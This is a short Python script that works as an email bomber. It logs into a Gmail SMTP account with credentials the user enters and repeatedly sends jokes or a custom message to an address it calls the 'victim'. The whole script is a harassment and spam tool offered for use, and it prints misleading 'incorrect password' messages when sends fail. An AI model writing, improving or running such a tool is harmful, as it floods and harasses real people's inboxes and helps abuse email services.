import pyjokes, smtplib, time, os,webbrowser
webbrowser.open("for gamil bomber.html")
main = smtplib.SMTP("smtp.gmail.com", '587')

main.ehlo()
main.starttls()
tf = True
try:
    total_message = int(input("How many message can i send :  "))
except:
    print("Enter here number.")
joke_yes_no = input("You want to send jokes [Y/N]")
c = total_message
error_count = 0
username = input("Enter your email :")
password = input("Enter your email's password: ")
victim = input("Enter the victim's email  : ")
try:
    main.login(username, password)
except:
    print("Try again")

if joke_yes_no in "Y" or joke_yes_no in "y":

    for new in range(0, c):
        joke = pyjokes.get_joke()
        main_message = joke + "Very funny."
        try:
            main.sendmail(username, victim, main_message)
            c = c + 1
        except:
            c = c - 1
            error_count = error_count + 1
            if error_count == 1:
                print(f"{main_message}\n")
                print(
                    "Incorrect password. We are trying with another way. Don't worry. Please don't trun off it. USE only English Language. If you use another language it will not be work.")
else:
    main_message = input("Enter the message  : ")
    for new in range(0, c):

        try:
            main.sendmail(username, victim, main_message)
            c = c + 1
        except:
            c = c - 1
            error_count = error_count + 1
            if error_count == 1:
                print(f"{main_message}\n")
                print("Incorrect password. We are trying with another way. Don't worry. Please don't trun off it.")

time.sleep(20)
os.system("cls || clear")
the_center_text = "\nSorry. Try again with another way or another language."
center = the_center_text.center(20)
print(center)
#